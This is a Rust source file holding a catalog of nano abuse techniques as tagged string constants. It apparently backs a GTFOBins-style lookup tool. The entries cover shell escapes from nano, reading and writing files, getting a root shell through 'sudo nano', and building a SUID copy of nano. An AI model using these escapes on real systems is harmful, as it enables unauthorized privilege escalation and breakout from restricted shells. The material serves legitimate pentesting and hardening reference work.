pub static BIN_NAME: &'static str = "nano";
pub static SH_CODE_1: &'static str = r#"
    
    nano
    ^R^X
    reset; sh 1>&0 2>&0
"#;
pub static SH_DESC_2: &'static str = "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.";
pub static SH_CODE_2: &'static str = r#"
    
    nano -s /bin/sh
    /bin/sh
    ^T
"#;
pub static FW_CODE: &'static str = r#"
    
    nano file_to_write
    DATA
    ^O
"#;
pub static FR_CODE: &'static str = r#"
    
    nano file_to_read
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo nano
    ^R^X
    reset; sh 1>&0 2>&0
"#;
pub static LSUID_DESC: &'static str = "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nano) .

    ./nano -s /bin/sh
    /bin/sh
    ^T
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
